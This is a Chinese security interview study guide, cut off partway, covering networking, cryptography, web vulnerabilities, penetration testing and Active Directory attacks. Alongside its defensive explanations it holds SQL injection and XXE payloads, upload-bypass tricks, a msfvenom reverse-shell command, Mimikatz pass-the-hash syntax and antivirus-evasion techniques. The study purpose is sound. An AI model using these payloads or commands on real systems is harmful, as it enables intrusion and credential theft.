01网络基础与协议

Q
OSI 七层模型与 TCP/IP 四层模型分别是什么？🔥 高频

OSI 七层（从上到下）：应用层 → 表示层 → 会话层 → 传输层 → 网络层 → 数据链路层 → 物理层。

TCP/IP 四层（从下到上）：网络接口层 → 网际层（IP）→ 传输层（TCP/UDP）→ 应用层（HTTP/FTP/DNS）。

对应关系与各层代表协议：

  • 应用层：HTTP、HTTPS、DNS、FTP、SMTP、SSH
  • 传输层：TCP（可靠）、UDP（不可靠）、端口号
  • 网际层：IP、ICMP、ARP、路由协议
  • 网络接口层：以太网帧、MAC 地址

记忆每层职责：物理层「传比特」、链路层「组帧寻址 MAC」、网络层「路由寻 IP」、传输层「端到端建连接」、会话层「建会话」、表示层「编解码加解密」、应用层「为用户服务」。

OSI 自上而下记「应表会传网链物」；安全面试重点在传输层（TCP/UDP）与网络层（IP）
Q
TCP 三次握手和四次挥手的过程？🔥 高频

三次握手（建立连接）：

  • 客户端发 SYN=1，序号 seq=x，进入 SYN_SENT
  • 服务端回 SYN=1, ACK=1，seq=y，ack=x+1，进入 SYN_RCVD
  • 客户端发 ACK=1，seq=x+1，ack=y+1，双方进入 ESTABLISHED

四次挥手（断开连接）：

  • 主动方发 FIN，进入 FIN_WAIT_1
  • 被动方回 ACK，进入 CLOSE_WAIT（半关闭，还能单向传数据）
  • 被动方发 FIN，主动方进入 TIME_WAIT
  • 主动方回 ACK，等待 2MSL 后关闭

为什么挥手要四次：因为 TCP 是全双工，被动方收到 FIN 后可能还有数据要发，ACK 和 FIN 不能合并，所以要分两次。

常见攻击：SYN Flood 只发 SYN 不回 ACK，耗尽服务端半连接队列。

握手「我好了-你也好了-收到」，挥手「我走-你应-你也走-我应」；挥手多一次是因为全双工要各自关
Q
HTTP 和 HTTPS 的区别？🔥 高频
  • 协议端口：HTTP 明文、默认 80；HTTPS 加密、默认 443
  • 加密层：HTTPS = HTTP + TLS/SSL，数据加密传输，防窃听、防篡改、防伪造
  • 身份认证：HTTPS 通过数字证书验证服务器身份，防钓鱼中间人
  • 性能：HTTPS 多一次 TLS 握手 + 加解密开销，稍慢
  • 搜索引擎：HTTPS 有 SEO 加权，浏览器标记安全

HTTPS 加密用混合加密：握手阶段用非对称（RSA/ECDHE）协商会话密钥，传输阶段用对称（AES）加密数据——兼顾安全与速度。

HTTP 裸奔，HTTPS 穿防弹衣；「非对称换钥匙，对称来跑数据」
Q
常见 HTTP 方法与常用状态码有哪些？

常用方法：GET（查）、POST（增/提交）、PUT（整体替换）、PATCH（部分更新）、DELETE（删）、HEAD（只要响应头）、OPTIONS（探测支持的方法）。

状态码分类：

  • 1xx 信息：100 Continue
  • 2xx 成功：200 OK、201 Created、204 No Content
  • 3xx 重定向：301 永久、302 临时、304 未修改（缓存）
  • 4xx 客户端错误：400 参数错、401 未认证、403 无权限、404 不存在、405 方法不允许
  • 5xx 服务端错误：500 内部错误、502 网关错、503 服务不可用、504 网关超时

安全视角：403 vs 401 用来判断是否已认证；302 重定向常被用于开放重定向与钓鱼。

状态码记「2 成 3 跳 4 错 5 崩」；401 没证件、403 有证件没权限
Q
Cookie、Session、Token 的区别与安全性？🔥 高频
  • Cookie：浏览器端存储的小数据，每次请求自动携带；有大小限制（约 4KB）
  • Session：服务端存储的会话数据，通过 SessionID（一般放 Cookie）关联用户；服务端可主动注销
  • Token（JWT）：无状态凭证，服务端不保存，通过签名验证；适合分布式/跨域

安全属性（Cookie 关键属性必背）：

  • HttpOnly：禁止 JS 读取，防 XSS 窃取
  • Secure：仅 HTTPS 传输，防明文泄露
  • SameSite：限制跨站携带，防 CSRF
  • Domain/Path：限定作用域；Expires/Max-Age：有效期
Cookie 存浏览器、Session 存服务端、Token 不落地；Cookie 三件套「HttpOnly 防 JS、Secure 防明文、SameSite 防 CSRF」
Q
DNS 工作原理？常见 DNS 攻击有哪些？🔥 高频

解析流程：浏览器 → 本地 hosts/缓存 → 本地 DNS（递归查询）→ 根服务器 → 顶级域（.com）→ 权威 DNS（返回 IP）。

记录类型：A（域名→IPv4）、AAAA（→IPv6）、CNAME（别名）、MX（邮件）、NS（权威服务器）、TXT（文本/SPF 校验）。

常见攻击：

  • DNS 劫持：篡改 DNS 解析结果，把用户导向钓鱼站
  • DNS 污染/缓存投毒：伪造应答注入缓存，使大量用户解析到恶意 IP
  • DNS Rebinding（重绑定）：先用正常 IP 通过校验，再解析到内网 IP 打穿 SSRF 防护
  • DNS 隧道：用 DNS 查询做隐蔽通信通道，绕过防火墙
DNS 是「电话簿」；攻击记住「劫持改结果、污染投缓存、隧道传数据、重绑打内网」
Q
常见端口与对应服务？🔥 高频
  • 21 FTP（明文，易被嗅探）
  • 22 SSH（远程管理，重点爆破对象）
  • 23 Telnet（明文，不安全）
  • 25/465/587 SMTP / SMTPS（邮件发送）
  • 53 DNS（UDP/TCP）
  • 80/443 HTTP / HTTPS
  • 110/143/993 POP3 / IMAP / IMAPS（邮件接收）
  • 135/137/139/445 Windows RPC / NetBIOS / SMB（内网横向重点）
  • 3306 MySQL、1433 SQL Server、5432 PostgreSQL、6379 Redis、27017 MongoDB
  • 8080/8000 常见 Web 代理或应用端口、8888 宝塔面板、9200 Elasticsearch
  • 3389 RDP 远程桌面、5900 VNC
记「80 网站 443 加密、22 远程 3389 桌面、445 内网横向、3306 数据库、6379 缓存」
Q
正向代理与反向代理的区别？
  • 正向代理：代理客户端，代表用户访问外网（如 VPN、科学上网、抓包代理）；服务器不知道真实客户端是谁
  • 反向代理：代理服务器，对外统一入口，转发到内部多台服务器（如 Nginx、负载均衡）；客户端不知道真实服务器是谁

安全用途：

  • 正向代理可做身份隐藏、内容过滤、访问控制
  • 反向代理可做 WAF、负载均衡、隐藏后端、统一 SSL 卸载
  • 渗透中常用正向代理链隐藏攻击源，用反向代理打内网（如 Nginx 反代内网 Web）
正向代理「替用户出门」，反向代理「替服务器迎客」；一个藏客户端，一个藏服务端

02密码学基础

Q
对称加密与非对称加密的区别？🔥 高频
  • 对称加密：加密解密用同一个密钥。代表：AES、DES、3DES、RC4、SM4（国密）。速度快，适合大数据量；难点是密钥分发
  • 非对称加密：公钥加密、私钥解密（或私钥签名、公钥验签），密钥成对。代表：RSA、ECC、DSA、SM2（国密）。速度慢，适合小数据量；解决密钥分发问题

安全要点：

  • 对称加密密钥不能通过明文信道传输，否则等同没加密
  • 非对称加密中 公钥公开、私钥必须保密；公钥加密保证机密性，私钥签名保证完整性/不可否认性
  • 实际系统都用混合加密：非对称协商密钥，对称加密数据（TLS 就是典型）
对称「一把钥匙开两把锁」，非对称「公钥上锁、私钥开锁」；面试必答「非对称慢、对称快，混合最实用」
Q
AES 加密原理？有哪些工作模式？

AES（高级加密标准）是分组对称加密，块长 128 位，密钥长度支持 128/192/256 位。基于 SPN 结构（代换-置换网络），轮数由密钥长度决定（10/12/14 轮），每轮做字节代换（SubBytes）、行移位（ShiftRows）、列混合（MixColumns）、轮密钥加（AddRoundKey）。

常见工作模式：

  • ECB：每块独立加密，相同明文块产生相同密文块，有模式泄露风险，不推荐
  • CBC：每块先与上一块密文异或再加密，需要 IV；PKCS7 填充 + 密文篡改（CBC 字节翻转攻击）是考点
  • CTR/GCM：流式模式，GCM 带认证（AEAD），推荐用于传输加密

国密对标：SM4 是国密分组算法，块长 128 位、密钥 128 位。

AES 记「128 分组、128/192/256 密钥、10/12/14 轮」；模式上「ECB 危险、CBC 防重放、GCM 最推荐」
Q
RSA 加密的原理？为什么说它安全？🔥 高频

RSA 基于大整数分解难题：

  • 选两个大素数 p、q，计算 n = p×q，φ(n) = (p-1)(q-1)
  • 选公钥指数 e（常用 65537），满足 gcd(e, φ(n)) = 1
  • 求私钥 d ≡ e⁻¹ mod φ(n)（e 关于 φ(n) 的乘法逆元）
  • 公钥 (n, e) 公开，私钥 d 保密
  • 加密：c = m^e mod n；解密：m = c^d mod n

安全性：知道 n 和 e 要推出 d，需要分解 n 为 p×q；当 n 足够大（2048 位以上）时在可接受时间内不可行。

常见攻击（面试加分）：

  • 模数共享攻击（共 n）、低加密指数攻击（e=3 小明文）、Wiener 攻击（d 过小）
  • 填充必须用 OAEP，裸 RSA 有可预测性/选择密文攻击风险
RSA 核心一句：「n 是两个素数相乘，安全靠分解不出」；e 公开、d 私藏，mod n 上下翻
Q
哈希算法有什么特点？常见算法与安全对比？🔥 高频

哈希（散列）是把任意长度数据映射为固定长度摘要的单向函数，特点：

  • 单向性：由摘要不可逆推出原文
  • 定长输出：MD5 128 位、SHA-1 160 位、SHA-256 256 位
  • 雪崩效应：输入微变，输出大变
  • 抗碰撞：很难找到两个不同输入产生相同摘要

常见算法安全结论：

  • MD5 / SHA-1 已不安全：可构造碰撞，只能用于校验完整性（如下载校验），禁止用于口令存储与签名
  • 推荐：SHA-256 / SHA-3 / SM3（国密）
  • 口令存储用慢哈希 + 盐：bcrypt、scrypt、Argon2
哈希四性「单向、定长、雪崩、抗碰撞」；MD5/SHA-1 已废，口令存储请用 bcrypt + 盐
Q
什么是加盐哈希？为什么要加盐？🔥 高频
  • 盐（Salt）：随机生成的字符串，拼接到密码后一起哈希，每个用户盐不同
  • 防止彩虹表：彩虹表是预计算的「明文-哈希」对照表，直接查表即可破解；加盐后同样的密码因盐不同哈希不同，预计算表失效
  • 防止相同密码哈希相同：不加盐时所有相同密码哈希一致，攻击者一次破解全中；加盐后完全打散
  • 防撞库：不同网站盐不同，一个站泄露不影响其他站

最佳实践：盐要随机且足够长、每用户唯一、与哈希一起存储；推荐 bcrypt/scrypt/Argon2（自带盐且刻意慢，提高暴力破解成本）。

盐是「腌料」，把密码腌入味再哈希；一句话「加盐 = 防彩虹表 + 防相同密码撞库」
Q
数字签名和数字证书的原理？🔥 高频

数字签名（保证完整性与不可否认性）：

  • 发送方对消息哈希，用私钥加密得到签名，随消息一起发出
  • 接收方用公钥解密签名得到摘要，再对消息计算哈希比对；一致则消息未被篡改且确为发送方所发

数字证书（X.509）：CA 机构用自己私钥给「公钥 + 主体信息 + 有效期」签名，形成证书，解决公钥信任问题。

  • 证书链：根 CA → 中间 CA → 服务器证书，逐级验证签名
  • 验证要素：签名有效、证书未过期、域名匹配、未被吊销（CRL/OCSP）
  • HTTPS 中服务器下发证书，客户端用内置根证书验证服务器身份
签名是「私钥盖章、公钥验章」；证书是「CA 给公钥发的身份证」；验证书看「签名、期限、域名、吊销」四件事
Q
TLS 握手流程是怎样的？🔥 高频

TLS 1.2 握手（简化版）：

  • ① 客户端发 ClientHello：支持的 TLS 版本、加密套件、随机数
  • ② 服务端回 ServerHello：选定版本与套件、服务端随机数，并下发证书
  • ③ 客户端验证证书（链、期限、域名），生成 pre-master secret，用服务端公钥加密发送
  • ④ 双方用三个随机数推导出会话密钥，各自发 Finished 确认
  • ⑤ 握手完成，之后用对称加密（AES-GCM）传输数据

TLS 1.3 优化：握手从 2-RTT 降到 1-RTT（0-RTT 恢复），只支持前向安全的 ECDHE 套件，删除了不安全算法（RC4、CBC 老套件、RSA 密钥交换）。

常见攻击：降级攻击（强制降到 TLS1.0）、中间人（证书验证不严时）、BEAST/POODLE/Heartbleed 等历史漏洞。

握手四步「打招呼、亮证书、换密钥、确认完成」；1.3 更快更安全，一句话「1RTT + ECDHE + 只留强套件」
Q
一个 HTTPS 请求从发起到底层完整的加密过程？
  • DNS 解析域名 → IP，建立 TCP 三次握手（443）
  • TLS 握手：协商加密套件与版本 → 服务器发证书 → 客户端验证证书 → 用服务器公钥加密传输 pre-master → 双方派生会话密钥
  • 应用层加密：HTTP 请求报文用会话密钥（AES 对称）加密后传输，附带 MAC/HMAC 保证完整性
  • 服务端解密、处理、响应同样加密回传，会话结束四次挥手

安全要点：非对称（RSA/ECDHE）只负责交换密钥，数据全走对称加密；ECDHE 支持前向安全（即使长期私钥泄露，历史流量也不可解）。

HTTPS 链路一句话：「TCP 建连 → TLS 换钥匙 → AES 跑数据」；非对称只换钥，对称才干活

03Web 安全漏洞

Q
SQL 注入的原理、危害与防御？🔥 高频

原理：用户输入未经过滤直接拼接进 SQL 语句，导致输入被当作 SQL 代码执行，改变了原有语句语义。

典型 Payload：`' OR 1=1 --`、`' UNION SELECT username,password FROM users --`、`' AND sleep(5) --`。

危害：拖库（泄露数据）、绕过认证、篡改删除数据、读写文件、命令执行（结合 UDF/xp_cmdshell）、提权。

防御（必背三板斧）：

  • 参数化查询/预编译（PreparedStatement）：输入只当数据不当代码，根治注入
  • 输入校验与白名单：类型、长度、格式校验；关键字过滤作为兜底
  • 最小权限：数据库账户只给所需权限，禁用危险函数（xp_cmdshell）
注入原理「输入变代码」；防御「参数化打底、白名单加固、最小权限兜底」
Q
什么是盲注？有哪些类型？🔥 高频

页面不回显查询结果的注入叫盲注，靠「是与否」的差异逐字符猜数据。

  • 布尔盲注：页面真假响应不同。Payload：`' AND SUBSTRING((SELECT password FROM users),1,1)='a' --`，逐位猜
  • 时间盲注：页面响应无差异时用延时判断。Payload：`' AND IF(1=1, SLEEP(5), 0) --`
  • 报错盲注：利用数据库报错信息带出数据，如 `updatexml(1,concat(0x7e,(SELECT password FROM users)),1)`

工具：sqlmap 可自动检测与利用，`--technique` 指定盲注类型。

盲注三兄弟「布尔看真假、时间看快慢、报错看异常」；本质都是「猜字符」
Q
XSS 的类型、危害与防御？🔥 高频

XSS（跨站脚本）：攻击者注入恶意 JS，在受害者浏览器执行。

  • 反射型：输入在响应中直接回显，一次性，需诱导点击恶意链接
  • 存储型：恶意脚本存到服务器（评论、昵称），任何访问者中招，危害最大
  • DOM 型：纯前端漏洞，恶意代码经 DOM 操作执行，服务端看不到 payload

危害：窃取 Cookie（会话劫持）、钓鱼、键盘记录、篡改页面、挖矿、配合 CSRF 越权操作。

防御：

  • 输出编码：上下文不同编码不同（HTML/属性/JS/URL），是治本手段
  • 输入过滤：白名单过滤标签与协议（javascript: 等）
  • CSP 内容安全策略限制脚本来源；Cookie 设 HttpOnly
XSS 记「反射一次、存储持久、DOM 纯前端」；防御口诀「输出编码治本、CSP 兜底、HttpOnly 保会话」
Q
CSRF 的原理与防御？🔥 高频

CSRF（跨站请求伪造）：用户已登录目标站，攻击者诱导浏览器自动携带合法 Cookie 发出伪造请求，服务端无法区分请求是否用户本意。

典型场景：`` 一访问即触发转账。

触发条件三要素：用户已登录 + 请求自动带凭据 + 服务端未校验来源。

防御：

  • CSRF Token：服务端下发随机 token，请求必须携带并校验（最常用）
  • SameSite Cookie：设为 Lax/Strict，跨站请求不自动携带（现代浏览器默认）
  • 校验 Referer/Origin：检查请求来源；敏感操作二次验证（验证码/短信）
CSRF 是「借刀杀人」，攻击者借浏览器这刀砍服务器；防御三件套「Token、SameSite、查来源」
Q
SSRF 的原理、危害与防御？🔥 高频

SSRF（服务端请求伪造）：服务端存在「根据用户输入发起请求」的功能（URL 抓取、图片下载、Webhook 回调），攻击者利用服务端当跳板访问本不该访问的内网资源。

危害：探测内网端口与存活主机、访问内网管理后台、读取云元数据（169.254.169.254 打云主机凭据）、攻击内网服务、文件读取（file://）。

防御：

  • 白名单域名/IP：只允许请求指定地址，禁止内网 IP 段（127.0.0.0/8、10/8、172.16/12、192.168/16）
  • DNS 重绑定防护：先解析校验 IP，再请求前再次解析比对
  • 限制协议（仅 http/https）、禁用重定向跟随、对响应做安全过滤
SSRF 是「服务端当炮灰帮你访问内网」；记住「白名单、禁内网、防重绑定」三条防线
Q
XXE 漏洞的原理与防御？

XXE（XML 外部实体注入）：XML 解析器允许加载外部实体（DTD 定义的实体指向外部资源），攻击者可读取本地文件或发起内网请求。

典型 Payload：

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
  • 危害：任意文件读取（file://）、内网探测（http://）、DoS（Billion Laughs 实体扩展）、RCE（配合 PHP expect）
  • 防御：禁用外部实体与 DTD（解析器设 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`）、升级 XML 库、尽量用 JSON 代替 XML
XXE 就是「XML 里藏了文件读取器」；看到 XML 接口先想到它，防御「禁用 DTD 一劳永逸」
Q
文件上传漏洞的绕过方式与防御？🔥 高频

攻击目标：上传 WebShell（PHP/JSP/ASP 一句话木马）获得命令执行。常见绕过：

  • 后缀绕过：双写（.pphphp）、大小写（.PhP）、末尾空格/点/`::$DATA`、解析漏洞（.php.1、.php%00.jpg）
  • Content-Type 绕过：抓包改 `Content-Type: image/png`
  • 图片马：图片尾部拼接恶意代码 + 文件包含触发
  • 前端校验绕过：直接构造 HTTP 请求跳过 JS 检查
  • .htaccess / .user.ini 上传配置文件开启解析

防御：白名单后缀 + 校验 MIME + 重命名文件（随机名无后缀语义）+ 存储与执行目录分离 + 上传目录禁脚本执行 + 图片二次渲染。

上传绕过记「后缀绕、类型改、图片马、配置劫」；防御核心「白名单 + 重命名 + 目录隔离」
Q
命令注入与远程代码执行（RCE）的区别？🔥 高频
  • 命令注入（Command Injection）：输入拼入系统命令。Payload 用分隔符：`;`、`|`、`&&`、`||`、反引号、`$(...)`。如 `ping 127.0.0.1; whoami`
  • 代码执行（Code Execution）：输入拼入代码被解释执行。如 PHP `eval($_POST['x'])`、Java `Runtime.exec`、Python `eval/exec`、反序列化、模板注入（SSTI）

危害：拿下服务器权限（WebShell、反弹 Shell）、读取敏感文件、横向渗透起点。

防御：

  • 命令执行优先用白名单函数/参数数组，避免拼接字符串
  • 禁止 eval/exec 类函数处理用户输入；输入做严格白名单校验
  • Web 服务最小权限运行，限制系统命令可用性（禁用危险命令）
命令注入「骗系统执行命令」，RCE「骗语言执行代码」；共性都是「输入被当指令」，防御都是「白名单 + 禁 eval」
Q
反序列化漏洞的原理与防御？🔥 高频

原理：应用对不可信数据反序列化时，构造的恶意对象数据在恢复对象过程中触发危险方法（如 Java `readObject`、PHP `__wakeup`/`__destruct`、Python pickle），导致 RCE。

典型链条：

  • Java：Shiro（AES 密钥硬编码 + Commons-Collections gadget）、Fastjson（autoType 反序列化）、Log4j2（JNDI 注入）
  • PHP：unserialize() + 魔法方法链；phar 反序列化（触发无需 unserialize）
  • Python：pickle.loads 恶意数据

防御：

  • 不要反序列化不可信数据；用 JSON 等安全格式替代原生序列化
  • 使用类白名单过滤（如 Java `ObjectInputFilter`、PHP allowed_classes）
  • 及时升级组件版本（gadget 依赖库），加固密钥管理
反序列化「数据里藏炸弹，恢复对象即引爆」；防御「不信外来数据、白名单类、升级组件」
Q
越权漏洞（IDOR）的原理与防御？🔥 高频

IDOR / 越权：服务端只校验「是否登录」而未校验「是否有权操作该资源」，通过修改资源 ID 即可访问他人数据。

  • 水平越权：同级别用户间越权，如把 `order?id=1001` 改成 `id=1002` 看他人订单
  • 垂直越权：低权限访问高权限功能，如普通用户调管理员接口

防御：

  • 服务端做对象级授权校验（OWASP API 重点）：资源归属与当前用户比对，不能只依赖前端隐藏
  • ID 使用不可枚举值（UUID/随机串），避免连续数字
  • 接口权限模型统一（RBAC/ABAC），敏感操作复核
越权一句话「只验登录不验归属」；防御核心「每次访问都查一下这资源是不是你的」
Q
目录遍历漏洞的原理与防御？

原理：路径参数未做校验直接拼入文件路径，攻击者用 ../ 跳出限制目录读取任意文件。

典型 Payload：`?file=../../../../etc/passwd`、URL 编码 `..%2f..%2f`、双重编码 `%252e%252e%252f`。

  • 危害：读取配置文件、源码、系统敏感文件（/etc/passwd、Windows 系统文件）
  • 防御：路径规范化（realpath）后校验必须位于白名单目录内、禁止拼接用户输入、文件服务用专用接口映射 ID 到文件
目录遍历「../ 爬楼出小区」；防御「realpath 归一化 + 目录白名单校验」
Q
点击劫持与 CORS 配置错误？🔥 高频

点击劫持（Clickjacking）：攻击者页面用 iframe 透明嵌入目标站，诱导用户点击实际按钮，完成恶意操作（点赞、转账、授权）。

防御：

  • 响应头 X-Frame-Options: DENY/SAMEORIGIN，禁止被 iframe 嵌入
  • 现代方案 CSP frame-ancestors：`Content-Security-Policy: frame-ancestors 'none'`

CORS 配置错误：服务端错误配置 `Access-Control-Allow-Origin` 为 `*` 或反射来源（Origin 回显），攻击者跨域请求即可读取接口数据。

利用条件：敏感接口依赖 Cookie 认证 + CORS 允许任意/反射来源 + 响应含敏感数据。防御：白名单精确配置 Origin、不使用 `*` 且认证接口配合凭据时要明确来源、`Vary: Origin`。

点击劫持「看不见的框让你点」→ X-Frame-Options 挡；CORS 错配「跨域白嫖接口」→ 来源白名单修

04渗透测试

Q
渗透测试的流程与阶段？🔥 高频

标准流程（PTES 思路）：

  • ① 授权与范围确认：签授权书，明确目标、时间、边界、规则（合法前提）
  • ② 信息收集：被动（OSINT、子域名、指纹）+ 主动（端口、服务、漏洞扫描）
  • ③ 漏洞发现：扫描 + 手工验证，识别可利用漏洞
  • ④ 漏洞利用：拿权限（WebShell、反弹 Shell、钓鱼）
  • ⑤ 后渗透：提权、横向移动、权限维持、数据获取
  • ⑥ 报告：整理漏洞、危害、复现步骤、修复建议

红蓝对比：红队模拟真实攻击全链路（更侧重绕检测与持久化）；渗透测试偏合规检查与漏洞验证。

流程六步「授权 → 收集 → 发现 → 利用 → 后渗透 → 报告」；口诀「先授权再动手」是红线
Q
信息收集主要收集哪些内容？🔥 高频
  • 域名与子域名：子域名爆破、证书透明度（crt.sh）、DNS 记录；资产越多入口越多
  • IP 与端口：存活主机、端口服务、C 段资产、CDN 绕过（真实 IP 查找）
  • 指纹识别：Web 框架（ThinkPHP、Spring）、CMS（WordPress）、WAF、容器（Docker/K8s）
  • Web 信息：robots.txt、源码注释、目录扫描、历史漏洞、后台路径
  • 人员与泄露：GitHub 敏感信息、邮箱、密码泄露库、员工信息（钓鱼用）
  • 技术栈：语言、中间件、数据库、云厂商（阿里云/腾讯云/AWS）

工具：subfinder/OneForAll（子域名）、nmap（端口）、fofa/quake/hunter（资产测绘）、whatweb/Wappalyzer（指纹）、dirsearch（目录）。

信息收集口诀「域名子域找入口、端口指纹找漏洞、源码泄露找凭据、测绘平台省力气」
Q
Nmap 的常用参数有哪些？🔥 高频
  • -sS SYN 半开扫描（默认，快且隐蔽）、-sT 全连接扫描、-sU UDP 扫描
  • -sV 服务版本探测、-O 操作系统识别、-sC 默认脚本扫描（等价 --script=default）
  • -p 指定端口（`-p 1-1000`、`-p-` 全端口）、-T0~5 时序（越慢越隐蔽）
  • -A 综合探测（OS+版本+脚本+traceroute）、-oN/-oX/-oG 输出格式
  • --script 漏洞脚本：`--script=vuln`、`--script=http-enum`；`-Pn` 跳过主机发现

经典组合：`nmap -sS -sV -A -T4 192.168.1.1`（快速全面扫描单主机）。

Nmap 记住「-sS 半开、-sV 版本、-sC 脚本、-O 系统、-A 全家桶、-p 指定口」
Q
Burp Suite 的常用模块？
  • Proxy：拦截/修改请求，抓包改包核心
  • Repeater：重放请求，手工测试漏洞（改参数、测注入）
  • Intruder：暴力破解、参数 fuzz（字典爆破、枚举）
  • Decoder/Comparer：编解码（Base64/URL）、响应对比
  • Scanner：自动漏洞扫描（专业版）
  • Extensions（BApp）：插件扩展，如 SQLiPy、Autorize（越权检测）、HaE（敏感信息标记）

搭配浏览器设置代理 127.0.0.1:8080，安装 CA 证书可抓 HTTPS。

Burp 四件套「Proxy 抓包、Repeater 重放、Intruder 爆破、Decoder 编解码」
Q
什么是指纹识别？怎么做？

指纹识别：通过响应特征判断目标使用的框架、CMS、中间件、WAF、语言，便于查找对应已知漏洞（Nday）。

识别维度：

  • HTTP 响应头：Server（nginx/OpenResty）、X-Powered-By（PHP/ASP.NET）、Set-Cookie（语言标识）
  • 页面特征：favicon.ico 哈希、特定 JS/CSS 路径、版权文字、meta generator
  • 路由与报错页：特定 404 页面、报错信息暴露框架
  • 工具：whatweb、Wappalyzer、ehole（鹰图）、TideFinger；fofa/quake 在线测绘
指纹三来源「响应头、页面特征、报错信息」；识别框架 → 搜 Nday → 直接打，是高效打法
Q
Metasploit（MSF）的基本使用流程？🔥 高频

核心概念：Exploit（漏洞利用模块）、Payload（攻击载荷）、Listener（监听器）、Session（会话）。

基本流程：

  • `search 漏洞关键字` 搜索模块 → `use exploit/...` 选择
  • `show options` / `set RHOSTS LPORT` 配置目标与参数
  • `set PAYLOAD windows/meterpreter/reverse_tcp` 选反弹 Payload
  • `exploit` 运行，拿到 Meterpreter 会话
  • 会话内常用：sysinfo（信息）、getuid（权限）、shell（系统 shell）、getsystem（提权）、hashdump（导出密码哈希）

配套：msfvenom 生成 Payload（`msfvenom -p windows/meterpreter/reverse_tcp LHOST=x LPORT=y -f exe -o shell.exe`）。

MSF 一条龙「search → use → set → exploit」；拿到会话先 sysinfo、getuid、shell 三板斧
Q
Linux 提权有哪些思路？🔥 高频
  • SUID 提权：`find / -perm -4000` 找 SUID 程序，利用可写脚本、环境变量劫持、已知漏洞（如 Nmap 交互模式）
  • 内核漏洞：`uname -a` 查内核版本，匹配 exp（脏牛 DirtyCow 等）
  • sudo 配置错误：`sudo -l` 查看当前用户可用命令，可利用 sudo 白名单逃逸（GTFOBins）
  • 定时任务：crontab 中可写脚本/通配符利用
  • 可写路径/文件：PATH 劫持、全局可写文件被 root 执行
  • 服务与配置泄露：数据库 root 弱口令、密钥文件、docker 组（挂载逃逸）

自动化工具：LinEnum、LinPEAS（一条命令收集提权线索）。

提权口诀「SUID 找、内核打、sudo 看、定时挖、路径劫」；先跑 LinPEAS 再动手
Q
免杀（AV Evasion）的原理？

目的：让恶意样本绕过杀软查杀。杀软查杀方式与对应绕过：

  • 特征码查杀（哈希/特征串）→ 加壳/混淆/编码（UPX、自定义加密 shellcode）改变特征
  • 静态启发式（可疑 API 调用）→ 分离加载/加密落地（shellcode 网络加载、内存执行）
  • 动态行为查杀（沙箱）→ 反沙箱/反调试（检测虚拟机、延迟执行、交互检测）
  • 云查/信誉 → 代码签名、白嫖白签名、小范围投放

常用技术：shellcode 异或/AES 加密 + 加载器（loader）内存加载、进程注入（远程线程 CreateRemoteThread）、PowerShell/C# 内存执行。

免杀就是「改特征躲静态、内存执行躲落地、反沙箱躲行为」；加壳加密 + 进程注入是主流

05内网渗透

Q
域渗透的基础概念？🔥 高频
  • 域（Domain）：Windows 集中管理的网络环境，域控 DC（Domain Controller）是核心，存储 AD 数据库（ntds.dit）
  • 域用户：统一认证登录；组策略 GPO 统一分发配置
  • Kerberos 认证是域内默认认证协议；NTLM 为兼容协议
  • AD 对象：用户、计算机、组（域管组 Domain Admins 是最高权限目标）

渗透目标链：单机 → 普通域用户 → 域管 → 域控。拿下域控 = 拿下整个域。

常用工具：BloodHound（AD 攻击路径可视化）、Mimikatz（抓取凭据）、ldapsearch（AD 枚举）。

域渗透核心「打域控、抓哈希、找域管」；一条线「拿机器 → 提权 → 抓凭据 → 横向 → 域控」
Q
Kerberos 认证流程及常见攻击？🔥 高频

认证流程（三票）：

  • ① 用户向 AS（认证服务）请求，AS 验证密码后返回 TGT 票据（用 krbtgt 哈希加密）
  • ② 用户拿 TGT 向 TGS（票据服务）申请访问服务的 ST 票据（用服务账户哈希加密）
  • ③ 用户拿 ST 访问目标服务，服务验证票据放行

常见攻击：

  • AS-REP Roasting：对不要求预认证的账户离线爆破（拿到的 AS-REP 可离线破解）
  • Kerberoasting：申请 SPN 服务票据离线爆破服务账户密码（GetUserSPNs）
  • Pass-the-Ticket：直接重放已有票据；黄金/白银票据见下题
Kerberos「AS 发 TGT、TGS 发 ST、服务验 ST」；攻击主流「Roasting 离线爆破 + 票据重放」
Q
黄金票据与白银票据的区别？🔥 高频
对比项黄金票据（Golden Ticket）白银票据（Silver Ticket）
伪造对象TGT（用 krbtgt 哈希签）ST（用服务账户 NTLM 哈希签）
所需哈希krbtgt 账户哈希（域控权限）目标服务账户哈希（可本机提权获取）
权限范围整个域任意账户任意服务仅单个服务（如 CIFS、HTTP）
隐蔽性较低（异常 TGT 易被检测）较高（不触发 KDC 日志）
有效期默认 10 年（自设）默认 10 年（自设）

防御：定期更换 krbtgt 密码（黄金票据失效）、开启 Kerberos 事件审计、监测异常票据。

金票「拿 krbtgt 签 TGT，管全域」；银票「拿服务哈希签 ST，管单服务」；金大银小、金高调银隐蔽
Q
Pass-the-Hash（哈希传递）的原理？🔥 高频

原理：Windows NTLM 认证中，客户端用密码哈希（NTLM Hash）而不是明文密码做挑战应答。只要拿到哈希，无需破解明文即可直接使用哈希完成认证。

前提条件：目标机器开放 SMB（445）、使用 NTLM 认证、被攻击账户未禁用。

利用方式：

  • Mimikatz：sekurlsa::pth /user:admin /ntlm:<hash> /domain:corp
  • 工具：Impacket（psexec.py、wmiexec.py、smbexec.py）、CrackMapExec（cme smb ... -H hash）
  • 配合 横向移动批量打同密码机器

防御：启用 Credential Guard（凭据保护）、限制本地管理员账户、禁用 NTLM 只留 Kerberos、定期改密码。

PTH 一句话「有哈希就不用明文，NTLM 认哈希不认人」；Mimikatz pth 一条命令横向打
Q
横向移动的常用方法？🔥 高频
  • PsExec 类：通过 SMB 创建服务执行命令（psexec.py、PsExec.exe），需管理员权限
  • WMI 远程执行：wmic/wmiexec 调用 Win32_Process.Create，无文件落地、更隐蔽
  • 计划任务/服务：schtasks 远程创建任务执行命令
  • RDP 横向：3389 远程桌面 + 凭据复用（hash 注入 RDP）
  • WinRM（5985/5986）：PowerShell Remoting，域内常用
  • 凭据收割：Mimikatz 抓明文/哈希、lsass 转储、SAM 导出，拿新凭据继续横向

思路闭环：拿凭据 → 批量探测同密码主机 → 远程执行 → 再抓新凭据 → 直到域控。

横向五板斧「PsExec、WMI、计划任务、RDP、WinRM」；核心是「凭据复用 + 远程执行」
Q
内网隧道与代理的作用？🔥 高频

作用：拿下边界机后，内网其他主机不直接可达，需要通过已控主机做跳板转发流量，访问内网资源。

  • 正向代理：目标开代理端口，攻击者连上去访问内网（frp、ew）
